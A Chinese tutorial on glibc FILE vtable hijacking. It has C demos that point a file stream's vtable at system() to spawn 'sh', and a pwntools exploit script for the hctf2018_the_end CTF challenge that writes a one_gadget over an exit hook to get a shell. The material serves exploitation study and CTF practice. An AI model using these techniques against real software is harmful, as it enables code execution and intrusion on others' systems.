# 伪造 vtable 劫持程序流程

## 简介：

1. 前面我们介绍了 Linux 中文件流的特性（FILE），我们可以得知 Linux 中的一些常见的 IO 操作函数都需要经过 FILE 结构进行处理。尤其是_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。

2. 因此伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过**把 vtable 指向我们控制的内存**，并在其中**布置函数指针**来实现。
3. 因此 vtable 劫持分为两种，一种是直接**改写** vtable 中的**函数指针**，通过任意地址写就可以实现。另一种是**覆盖 vtable 的指针**指向我们控制的内存，然后在其中**布置函数指针**。

## 实践：

1. 这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，对于 fopen 的情况下是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。

   ```c
   int main(void)
   {
       FILE *fp;
       long long *vtable_ptr;
       fp=fopen("123.txt","rw");
       vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable
       vtable_ptr[7]=0x41414141; //xsputn
       printf("call 0x41414141");
   }
   ```

   根据 vtable 在_IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后需要搞清楚欲劫持的 IO 函数会调用 vtable 中的哪个函数。关于 IO 函数调用 vtable 的情况已经在 FILE 结构介绍一节给出了，知道了 printf 会调用 vtable 中的 xsputn，并且 xsputn 的是 vtable 中第八项之后就可以写入这个指针进行劫持。

   并且在 xsputn 等 vtable 函数进行调用时，传入的**第一个参数其实是对应的_ IO_FILE_plus 地址**。比如这例子调用 printf，传递给 vtable 的**第一个参数就是_ IO_2_1_stdout_**的地址。

   调试：

   ![image-20240807155124494](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408071551066.png)

   利用这点可以实现给**劫持的 vtable 函数传參**，比如 ：

   ```c
   #include <stdlib.h>
   #include <stdio.h>
   #include <string.h>
   #define system_ptr 0x7ffff78453a0;
   int main(void)
   {
       FILE *fp;
       long long *vtable_ptr;
       fp=fopen("123.txt","rw");
       vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable
       memcpy(fp,"sh",3);
       vtable_ptr[7]=system_ptr; //xsputn
       fwrite("hi",2,1,fp);
   }
   
   ```

   ![image-20240807160015251](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408071600413.png)

   ![image-20240807160145961](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408071601762.png)

   最后触发：

   ![image-20240807160301054](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408071603515.png)



2. 但是在目前 libc2.23 版本下，位于 **libc 数据段的 vtable 是不可以进行写入**的（没权限）。不过，通过在可控的内存中**伪造 vtable** 的方法依然可以实现利用：

   ![image-20240807160635653](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408071606364.png)

   ```c
   #include <stdlib.h>
   #include <stdio.h>
   #include <string.h>
   #define system_ptr 0x7ffff78453a0;
   int main(void)
   {
       FILE *fp;
       long long *vtable_addr,*fake_vtable;
       fp=fopen("123.txt","rw");
       fake_vtable=malloc(0x40);//伪造vtable
       vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset
       vtable_addr[0]=(long long)fake_vtable;//修改原vtable指针，指向伪造的vtable，后面系统取函数指针时就会去伪造的vtable中取
       memcpy(fp,"sh",3);
       fake_vtable[7]=system_ptr; //xsputn
       fwrite("hi",2,1,fp);
   }
   ```

   原vtable：
   
   ![image-20240807161845863](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408071618551.png)
   
   伪造的vtable：
   
   ![image-20240807161447568](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408071614188.png)
   
   我们首先分配一款内存来存放**伪造的 vtable**，之后**修改_IO_FILE_plus 的 vtable 指针指向这块内存**。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 "/bin/sh" 或 "sh"。
   
   因为 vtable 中的函数调用时会把对应的**_ IO_FILE_plus 指针作为第一个参数传递**，因此这里我们把 "sh" 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system("sh")。
   
   同样，如果程序中不存在 fopen 等函数创建的_ IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。



## 例题：hctf2018_the_end

题目地址：[hctf2018_the_end](https://buuoj.cn/challenges#hctf2018_the_end)

### 思路：

1. 利用的是在程序调用 `exit` 后，会遍历 `_IO_list_all` ，调用 `_IO_2_1_stdout_` 下的 `vtable` 中 `_setbuf` 函数。

   ![image-20240808111424856](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408081114995.png)

2. 在原vtable附近找一个新的vtable，用来伪造vtable（只用修改后两位）
3. 在伪造的vtable中修改_setbuf函数指向one_gadget（只用修改后三位）



```py
from pwn import *
import numpy as np
# from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')

def debug():
    print(proc.pidof(p))
    pause()

# p = remote("node5.buuoj.cn",26690)
# libc = ELF('./libc-2.27.so')
p = process("./pwn") 
libc = ELF("/home/kali/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so")
# elf = ELF("./pwn")

# 泄漏libc地址
p.recvuntil(b"gift ")
addr = eval((p.recv(14)).decode())
success("main_arena_unsortbin_addr==>"+hex(addr))
sleep_addr = libc.symbols["sleep"]
libc_base = addr-sleep_addr
success("libc_addr==>"+hex(libc_base))
 
#计算_IO_2_1_stdout_地址
IO_2_1_stdout_addr = libc_base + libc.sym["_IO_2_1_stdout_"]
success("IO_2_1_stdout_addr==>" + hex(IO_2_1_stdout_addr))
vtable_addr = libc_base + 0x3EC838
success("vtable_addr==>" + hex(vtable_addr))

# 修改vtable指针，指向伪造的vtable
fake_addr = libc_base + 0x3c3fb0
success("fake_addr==>" + hex(fake_addr))
fake_setbuf_addr = libc_base + 0x3EB058
success("fake_setbuf_addr==>" + hex(fake_setbuf_addr))
exit_hook = libc_base + 0x628F68 - 8
success("exit_hook==>" + hex(exit_hook))
# p.send(p64(vtable_addr))
# p.send(p8(fake_addr&0xff))
# p.send(p64(vtable_addr+1))
# p.send(p8((fake_addr>>8)&0xff))

# #修改伪造的vtable中的_setbuf指针，指向one_gadget
one_gadget = [0x4f2be,0x4f2c5,0x4f322,0x10a38c]
execve = libc_base + one_gadget[2]
# success("execve==>" + hex(execve))
# debug()
# p.send(p64(fake_setbuf_addr))
# p.send(p8(execve&0xff))
# p.send(p64(fake_setbuf_addr+1))
# p.send(p8((execve>>8)&0xff))
# p.send(p64(fake_setbuf_addr+2))
# p.send(p8((execve>>16)&0xff))
debug()
p.send(p64(exit_hook))
p.send(p8((execve)&0xff))
# sleep(1)
p.send(p64(exit_hook+1))
p.send(p8((execve>>8)&0xff))
print(hex(exit_hook+1))
p.send(p64(exit_hook+2))
p.send(p8((execve>>16)&0xff))
# debug()
p.send(p64(exit_hook+3))
p.send(p8((execve>>24)&0xff))
p.send(p64(exit_hook+4))
p.send(p8((execve>>32)&0xff))
# debug()
# p.sendline(b"exec 1>&0")
# p.sendline(b"cat flag")
p.interactive()
```

